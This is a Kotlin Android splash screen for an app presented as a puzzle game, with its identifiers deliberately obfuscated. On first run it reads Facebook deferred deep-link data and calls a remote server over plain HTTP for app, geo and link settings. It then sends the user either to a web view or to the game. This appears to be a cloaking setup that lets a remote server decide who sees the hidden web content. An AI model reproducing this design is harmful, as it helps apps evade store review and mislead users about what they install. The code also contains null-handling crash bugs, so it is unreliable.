package com.xgamesgroup.puzz.hjujiktgrfrf

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.xgamesgroup.puzz.R
import com.xgamesgroup.puzz.adreffr.AppapapapapaClas
import com.xgamesgroup.puzz.adreffr.AppapapapapaClas.Companion.deepConst
import com.xgamesgroup.puzz.thyjuju.VebgtfddActivity2
import com.xgamesgroup.puzz.adreffr.AppapapapapaClas.Companion.gtjtgjogtjigt
import com.xgamesgroup.puzz.bgnhujjuju.Fjirjfjijgitjgtijigttg
import com.xgamesgroup.puzz.bhhyyhjuju.GamymumumumumActivity2
import com.xgamesgroup.puzz.gthyjuujuj.SecondTvoooooo
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import retrofit2.Retrofit
import retrofit2.adapter.rxjava3.RxJava3CallAdapterFactory
import retrofit2.converter.gson.GsonConverterFactory

class SplachSplaaaaaaaaass : AppCompatActivity() {

    private var rfvfnvfgthugtguhgt: CompositeDisposable? = null

    private fun onResponse(response: Fjirjfjijgitjgtijigttg.Nfrjfrjijjjrf) {
        gtjtgjogtjigt["AppsCh"] = response.pheonixapps
        gtjtgjogtjigt["GeoHose"] = response.pheonixgeo
        gtjtgjogtjigt["View"] = response.pheonixlink
        startActivity(Intent(this, SecondTvoooooo::class.java))
        finish()
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splach_splaaaaaaaaass)

        val frjirfjjgtijigt = Fjirjfjijgitjgtijigttg()


        val fvrfgjtgtjigtgt = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (fvrfgjtgtjigtgt.getBoolean("activity_exec", false)) {
            val cffrrfgrfgtgtgt = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)
            val vffrbfrygfrgyrf =  cffrrfgrfgtgtgt.getString("ENTRY_CODE", "0")
            if (vffrbfrygfrgyrf == "web"){
                startActivity(Intent(this, VebgtfddActivity2::class.java))
                finish()
            } else {
                startActivity(Intent(this, GamymumumumumActivity2::class.java))
                finish()
            }
        } else {
            val gtojgfjrfhuifrhfr = fvrfgjtgtjigtgt.edit()
            gtojgfjrfhuifrhfr.putBoolean("activity_exec", true)
            gtojgfjrfhuifrhfr.apply()


            getttdepapappde(this)


            rfvfnvfgthugtguhgt = CompositeDisposable()

            val rfjoigtrjogtjjgtijgt = Retrofit.Builder()
                .baseUrl("http://phoenixofmine.life/")
                .addCallAdapterFactory(RxJava3CallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build().create(Fjirjfjijgitjgtijigttg.OIJfjjrfojfjrf::class.java)

            rfvfnvfgthugtguhgt?.add(
                rfjoigtrjogtjjgtijgt.gogogtadatata()
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribeOn(Schedulers.io())
                    .subscribe({ response -> onResponse(response) }, { t -> onFailure(t) })
            )
        }





    }
    private fun onFailure(t: Throwable) {
        Toast.makeText(this,t.message, Toast.LENGTH_SHORT).show()
    }

    fun getttdepapappde(context: Context) {

        Log.d("lolo", "deepL start loading")
        Log.d("lolo", "deepConst ${deepConst}")



        AppLinkData.fetchDeferredAppLinkData(
            context
        ) {
            if (it == null){
                Log.d("lolo", "deepL: NUULLAA")
            }
            if (it!!.targetUri == null){
                Log.d("lolo", "it!!.targetUri == null")

            }
            val deeepapapappa = it!!.targetUri?.host.toString()
            Log.d("FB_TAG", "deepL: I'm alive")
            Log.d("lolo", "deepL: I'm alive")
            deepConst = deeepapapappa
            Log.d("lolo", "deepL: $deeepapapappa")

            gtjtgjogtjigt["FBData"] = deeepapapappa

            Log.d("lolo", "appaclass $AppapapapapaClas")

        }
    }



}